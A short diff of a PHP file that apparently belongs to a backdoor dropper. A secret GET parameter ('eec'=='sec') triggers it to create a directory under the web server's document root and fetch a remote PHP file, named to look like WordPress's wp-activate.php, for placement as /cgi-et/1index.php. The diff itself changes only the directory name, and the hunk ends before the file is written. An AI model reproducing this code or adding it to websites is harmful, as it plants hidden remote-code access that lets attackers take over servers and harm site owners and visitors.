@@ -1,7 +1,7 @@
 <?php 
 
 if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){ 
-mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
+mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
 
 $file = sexx('https://raw.githubusercontent.com/HecSec/New/main/wp-activate.php');
 $local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/1index.php";
